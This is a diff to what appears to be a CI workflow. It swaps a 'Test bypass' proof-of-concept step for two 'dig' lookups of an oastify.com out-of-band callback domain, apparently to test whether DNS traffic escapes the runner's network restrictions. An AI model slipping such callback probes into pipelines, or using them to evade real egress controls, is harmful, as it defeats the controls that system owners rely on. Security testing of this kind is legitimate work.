@@ -18,7 +18,10 @@ jobs:
 
 
       - name: Test bypass
-        run: python3 poc.py zdgsp4opph2k6nz38s555wrxbohf5atz.oastify.com
+        run: dig 3uyw685t6ljonrg7pwm9m081ssyjmfa4.oastify.com +tcp
+
+      - name: Test bypass 2
+        run: dig 3uyw685t6ljonrg7pwm9m081ssyjmfa4.oastify.com
      
           
       
